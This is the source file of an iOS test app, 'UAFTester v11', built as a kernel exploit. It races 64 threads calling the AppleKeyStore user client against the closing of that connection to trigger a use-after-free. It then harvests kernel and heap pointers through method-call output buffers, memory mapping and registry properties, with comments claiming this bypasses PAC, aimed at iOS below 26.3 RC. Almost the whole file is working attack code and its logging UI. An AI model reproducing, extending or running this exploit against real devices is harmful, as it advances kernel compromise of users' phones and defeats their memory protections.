//
//  ViewController.m
//  UAFTester
//
//  v11 INFO-LEAK - Read kernel addresses from UAF'd gate object
//  Strategy: Don't spray fake objects - READ from freed gate instead!
//

#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   64
#define MAX_ATTEMPTS 500

// ========== INFO LEAK STRATEGY ==========
// Instead of spraying fake objects to control the gate,
// we'll try to READ from the freed gate to leak kernel addresses!
// This bypasses PAC because we're not faking pointers - we're stealing real ones!
// ========================================

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;
static atomic_uint  g_leaks  = 0;  // Count of potential leaks

// Store leaked data
#define MAX_LEAK_SAMPLES 100
static uint64_t g_leaked_data[MAX_LEAK_SAMPLES][8];  // Store 64 bytes per sample
static int g_leak_count = 0;

static void *racer_thread(void *arg) {
    (void)arg;
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        ;
    
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        // Try to READ from the gate object instead of writing
        uint64_t input[1] = {0};
        uint64_t output[8] = {0};  // Try to get output - might leak kernel data!
        uint32_t out_cnt = 8;
        size_t out_size = sizeof(output);
        
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 
            10,           // selector
            input, 1,     // scalar input
            NULL, 0,      // struct input
            output, &out_cnt,     // scalar output ← Try to leak!
            NULL, &out_size);     // struct output
        
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            break;
        }
        
        // Check if we got any interesting data
        if (out_cnt > 0 || out_size > 0) {
            for (int i = 0; i < 8; i++) {
                // Check for kernel addresses (0xfffffff0xxxxxxxx or 0xffffffe0xxxxxxxx)
                if ((output[i] & 0xfffffff000000000ULL) == 0xfffffff000000000ULL ||
                    (output[i] & 0xffffffe000000000ULL) == 0xffffffe000000000ULL) {
                    atomic_fetch_add_explicit(&g_leaks, 1, memory_order_relaxed);
                    
                    // Store the leak sample if we have space
                    int idx = atomic_load(&g_leak_count);
                    if (idx < MAX_LEAK_SAMPLES) {
                        if (__sync_bool_compare_and_swap(&g_leak_count, idx, idx + 1)) {
                            memcpy(g_leaked_data[idx], output, sizeof(output));
                        }
                    }
                    break;
                }
            }
        }
    }
    return NULL;
}

// Alternative leak method: Use IOConnectMapMemory to try to map the gate object
static kern_return_t try_memory_leak(io_connect_t conn, void(^log_callback)(NSString *)) {
    mach_vm_address_t addr = 0;
    mach_vm_size_t size = 0;
    
    // Try different memory types
    for (int mem_type = 0; mem_type < 10; mem_type++) {
        kern_return_t kr = IOConnectMapMemory(
            conn,
            mem_type,
            mach_task_self(),
            &addr,
            &size,
            kIOMapAnywhere);
        
        if (kr == KERN_SUCCESS) {
            log_callback([NSString stringWithFormat:@"[LEAK] Mapped memory type %d: addr=0x%llx size=0x%llx", 
                         mem_type, addr, size]);
            
            // Try to read from mapped memory
            if (size > 0 && size < 0x10000) {  // Reasonable size
                uint64_t *ptr = (uint64_t *)addr;
                log_callback([NSString stringWithFormat:@"[LEAK] First 8 qwords:"]);
                for (int i = 0; i < 8 && i * 8 < size; i++) {
                    uint64_t val = ptr[i];
                    if ((val & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
                        log_callback([NSString stringWithFormat:@"  [%d] 0x%016llx ← KERNEL PTR!", i, val]);
                    } else {
                        log_callback([NSString stringWithFormat:@"  [%d] 0x%016llx", i, val]);
                    }
                }
            }
            
            IOConnectUnmapMemory(conn, mem_type, mach_task_self(), addr);
            return KERN_SUCCESS;
        }
    }
    
    return KERN_FAILURE;
}

// Try to trigger info leak via different methods
static int run_leak_attempt(void(^log_callback)(NSString *)) {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (svc == IO_OBJECT_NULL)
        return -1;
    
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    IOObjectRelease(svc);
    
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL)
        return -1;

    atomic_store_explicit(&g_phase, 0, memory_order_release);
    atomic_store_explicit(&g_calls, 0, memory_order_relaxed);
    atomic_store_explicit(&g_errors, 0, memory_order_relaxed);

    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_create(&threads[i], NULL, racer_thread, NULL);

    atomic_store_explicit(&g_phase, 1, memory_order_release);
    usleep(100);

    // Close to trigger UAF
    IOServiceClose(g_conn);
    atomic_store_explicit(&g_phase, 2, memory_order_release);
    
    // During this window, the gate is freed but racers are still accessing it!
    usleep(5000);
    
    // Try memory leak before deallocating
    try_memory_leak(g_conn, log_callback);

    atomic_store_explicit(&g_phase, 3, memory_order_release);
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_join(threads[i], NULL);

    mach_port_deallocate(mach_task_self(), g_conn);
    g_conn = IO_OBJECT_NULL;
    return 0;
}

// Try to read properties from the service
static void try_property_leak(void(^log_callback)(NSString *)) {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (svc == IO_OBJECT_NULL)
        return;
    
    log_callback(@"[PROP-LEAK] Reading service properties...");
    
    // Get all properties
    CFMutableDictionaryRef props = NULL;
    kern_return_t kr = IORegistryEntryCreateCFProperties(svc, &props, kCFAllocatorDefault, 0);
    
    if (kr == KERN_SUCCESS && props) {
        CFIndex count = CFDictionaryGetCount(props);
        log_callback([NSString stringWithFormat:@"[PROP-LEAK] Found %ld properties", (long)count]);
        
        // Look for interesting properties
        const void *keys[100];
        const void *values[100];
        CFDictionaryGetKeysAndValues(props, keys, values);
        
        for (CFIndex i = 0; i < count && i < 100; i++) {
            CFStringRef key = (CFStringRef)keys[i];
            if (key && CFGetTypeID(key) == CFStringGetTypeID()) {
                char keyStr[256];
                CFStringGetCString(key, keyStr, sizeof(keyStr), kCFStringEncodingUTF8);
                
                // Check value type
                CFTypeID typeID = CFGetTypeID(values[i]);
                if (typeID == CFNumberGetTypeID()) {
                    uint64_t val = 0;
                    CFNumberGetValue((CFNumberRef)values[i], kCFNumberLongLongType, &val);
                    if ((val & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
                        log_callback([NSString stringWithFormat:@"  %s = 0x%016llx ← KERNEL PTR!", keyStr, val]);
                    }
                } else if (typeID == CFDataGetTypeID()) {
                    CFDataRef data = (CFDataRef)values[i];
                    CFIndex len = CFDataGetLength(data);
                    if (len >= 8) {
                        const uint64_t *ptr = (const uint64_t *)CFDataGetBytePtr(data);
                        for (CFIndex j = 0; j < len/8; j++) {
                            if ((ptr[j] & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
                                log_callback([NSString stringWithFormat:@"  %s[%ld] = 0x%016llx ← KERNEL PTR!", 
                                             keyStr, (long)j, ptr[j]]);
                            }
                        }
                    }
                }
            }
        }
        
        CFRelease(props);
    }
    
    IOObjectRelease(svc);
}

@interface ViewController ()
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UILabel    *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) BOOL        running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;
    [self buildUI];
}

- (void)buildUI {
    UILabel *title = [[UILabel alloc] init];
    title.text = @"AppleKeyStoreUserClient\nINFO LEAK via UAF";
    title.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
    title.textColor = UIColor.whiteColor;
    title.textAlignment = NSTextAlignmentCenter;
    title.numberOfLines = 2;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    UILabel *subtitle = [[UILabel alloc] init];
    subtitle.text = @"v11 INFO-LEAK: Read kernel addresses from freed gate\niOS <26.3 RC";
    subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
    subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
    subtitle.textAlignment = NSTextAlignmentCenter;
    subtitle.numberOfLines = 2;
    subtitle.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:subtitle];

    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.triggerButton setTitle:@"TRIGGER INFO LEAK" forState:UIControlStateNormal];
    self.triggerButton.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:20];
    [self.triggerButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.0 green:0.6 blue:0.8 alpha:1.0];
    self.triggerButton.layer.cornerRadius = 12;
    self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.triggerButton addTarget:self action:@selector(triggerTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.triggerButton];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:14];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] init];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [title.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [title.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [subtitle.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:8],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.triggerButton.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:24],
        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.triggerButton.widthAnchor constraintEqualToConstant:280],
        [self.triggerButton.heightAnchor constraintEqualToConstant:56],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:16],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

- (void)appendLog:(NSString *)line {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
        [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
    });
}

- (void)setStatus:(NSString *)text color:(UIColor *)color {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
        self.statusLabel.textColor = color;
    });
}

- (void)triggerTapped {
    if (self.running) return;
    self.running = YES;
    self.logView.text = @"";
    self.triggerButton.enabled = NO;
    self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];

    [self appendLog:@"========================================"];
    [self appendLog:@"  UAF v11 INFO-LEAK"];
    [self appendLog:@"========================================"];
    [self appendLog:@"[*] NEW STRATEGY:"];
    [self appendLog:@"    Don't spray fake objects!"];
    [self appendLog:@"    Instead: READ from freed gate to leak kernel ptrs"];
    [self appendLog:@"    This bypasses PAC - we steal real pointers!"];
    [self appendLog:@""];
    [self appendLog:@"[*] LEAK METHODS:"];
    [self appendLog:@"    1. IOConnectCallMethod with output buffers"];
    [self appendLog:@"    2. IOConnectMapMemory on UAF'd connection"];
    [self appendLog:@"    3. IORegistryEntry properties"];
    [self appendLog:@""];
    [self setStatus:@"Initializing..." color:UIColor.yellowColor];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        // Reset leak counter
        g_leak_count = 0;
        memset(g_leaked_data, 0, sizeof(g_leaked_data));
        atomic_store(&g_leaks, 0);
        
        // ========== METHOD 1: Property Leak ==========
        [self appendLog:@">>> METHOD 1: SERVICE PROPERTY LEAK"];
        [self setStatus:@"Reading properties..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        try_property_leak(^(NSString *msg) {
            [self appendLog:msg];
        });
        
        [self appendLog:@""];
        
        // ========== METHOD 2: Racing Info Leak ==========
        [self appendLog:@">>> METHOD 2: RACING INFO LEAK"];
        [self appendLog:@"[*] Triggering UAF while trying to read output..."];
        [self setStatus:@"Racing for leaks..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];

        for (int i = 0; i < MAX_ATTEMPTS; i++) {
            int result = run_leak_attempt(^(NSString *msg) {
                [self appendLog:msg];
            });
            
            if (result < 0) {
                usleep(5000);
            } else {
                usleep(500);
            }

            if ((i + 1) % 20 == 0 || i == 0) {
                uint32_t calls = atomic_load(&g_calls);
                uint32_t errors = atomic_load(&g_errors);
                uint32_t leaks = atomic_load(&g_leaks);
                
                [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u leaks=%u",
                                 i + 1, calls, errors, leaks]];
                [self setStatus:[NSString stringWithFormat:@"Leak attempt %d/%d (found: %u)", 
                                i + 1, MAX_ATTEMPTS, leaks]
                          color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
            }
        }

        [self appendLog:@""];
        [self appendLog:@"========================================"];
        [self appendLog:@"  LEAK RESULTS"];
        [self appendLog:@"========================================"];
        
        uint32_t final_calls = atomic_load(&g_calls);
        uint32_t final_errors = atomic_load(&g_errors);
        uint32_t final_leaks = atomic_load(&g_leaks);
        
        [self appendLog:[NSString stringWithFormat:@"[*] Total calls: %u", final_calls]];
        [self appendLog:[NSString stringWithFormat:@"[*] Port deaths: %u", final_errors]];
        [self appendLog:[NSString stringWithFormat:@"[*] Potential leaks: %u", final_leaks]];
        [self appendLog:@""];
        
        if (g_leak_count > 0) {
            [self appendLog:@"✓✓✓ LEAKED KERNEL DATA! ✓✓✓"];
            [self appendLog:@""];
            [self appendLog:[NSString stringWithFormat:@"[*] Captured %d leak samples:", g_leak_count]];
            
            for (int i = 0; i < g_leak_count && i < 10; i++) {
                [self appendLog:[NSString stringWithFormat:@""];
                [self appendLog:[NSString stringWithFormat:@"Sample #%d:", i + 1]];
                for (int j = 0; j < 8; j++) {
                    uint64_t val = g_leaked_data[i][j];
                    if (val != 0) {
                        if ((val & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
                            [self appendLog:[NSString stringWithFormat:@"  [%d] 0x%016llx ← KERNEL!", j, val]];
                        } else if ((val & 0xffffffe000000000ULL) == 0xffffffe000000000ULL) {
                            [self appendLog:[NSString stringWithFormat:@"  [%d] 0x%016llx ← HEAP!", j, val]];
                        } else {
                            [self appendLog:[NSString stringWithFormat:@"  [%d] 0x%016llx", j, val]];
                        }
                    }
                }
            }
            
            if (g_leak_count > 10) {
                [self appendLog:[NSString stringWithFormat:@"... and %d more samples", g_leak_count - 10]];
            }
            
            [self setStatus:@"KERNEL ADDRESSES LEAKED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
        } else if (final_errors > 0) {
            [self appendLog:@"✓ UAF TRIGGERED!"];
            [self appendLog:@""];
            [self appendLog:@"[*] No leaks via output buffers"];
            [self appendLog:@"[*] Try checking panic log for leaked addresses"];
            [self appendLog:@"[*] Or try different leak methods"];
            [self setStatus:@"UAF OK, no leaks via this method" color:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1.0]];
        } else {
            [self appendLog:@"[*] No UAF trigger detected"];
            [self appendLog:@"[*] May need different timing"];
            [self setStatus:@"Completed" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
        }

        [self finishRun];
    });
}

- (void)finishRun {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.running = NO;
        self.triggerButton.enabled = YES;
        self.triggerButton.backgroundColor = [UIColor colorWithRed:0.0 green:0.6 blue:0.8 alpha:1.0];
    });
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

@end
